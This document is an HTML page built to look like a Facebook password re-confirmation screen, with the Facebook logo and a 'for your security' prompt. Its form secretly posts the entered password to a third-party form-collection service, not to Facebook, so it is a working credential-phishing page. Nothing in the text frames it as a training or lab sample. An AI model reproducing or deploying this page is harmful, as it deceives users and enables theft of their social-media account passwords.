<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Facebook â€” Password</title>
  <style>
    body {
      font-family: system-ui, Segoe UI, Roboto, Arial;
      background: #f4f6f8;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px;
    }
    .card {
      background: #fff;
      padding: 28px;
      border-radius: 12px;
      box-shadow: 0 8px 30px rgba(15, 23, 42, 0.06);
      width: 420px;
      max-width: 100%;
      text-align: center;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      text-align: left;
    }
    input {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 1px solid #e6e9ee;
      font-size: 15px;
    }
    button {
      margin-top: 12px;
      padding: 12px 16px;
      border-radius: 8px;
      border: none;
      background: #1877f2;
      color: #fff;
      font-weight: 600;
      cursor: pointer;
      width: 100%;
      transition: background 0.2s ease;
    }
    button:hover {
      background: #145dbf;
    }
    .note {
      font-size: 13px;
      color: #6b7280;
      margin-top: 12px;
    }
    .error {
      margin-top: 12px;
      color: #b91c1c;
      background: #fff1f2;
      padding: 10px;
      border-radius: 8px;
    }
    .logo {
      width: 60px;
      height: 60px;
      object-fit: contain;
      margin-bottom: 12px;
    }
  </style>
</head>
<body>
  <main class="card" role="main">
    <!-- Facebook logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
         alt="Facebook Logo"
         class="logo">

    <h1>Re-enter your password to continue</h1>
    <p class="note">For your security, please confirm your Facebook password to continue.</p>

    <!-- Form submission -->
    <form id="pw-form"
          method="post"
          action="https://submit-form.com/JwN5wK5Vm"
          autocomplete="off">
      <!-- hidden field to indicate which step this is -->
      <input type="hidden" name="step" value="password">

      <label for="password">Password</label>
      <input id="password" name="password" type="password" required autocomplete="off" placeholder="Enter your password">
      <button type="submit">Continue</button>
    </form>

    <!-- error display -->
    <div id="server-error"></div>

    <script>
      // Optional: Show server error if ?error= is present
      const params = new URLSearchParams(window.location.search);
      if (params.get('error')) {
        const d = document.createElement('div');
        d.className = 'error';
        d.textContent = decodeURIComponent(params.get('error'));
        document.getElementById('server-error').appendChild(d);
      }
    </script>
  </main>
</body>
</html>
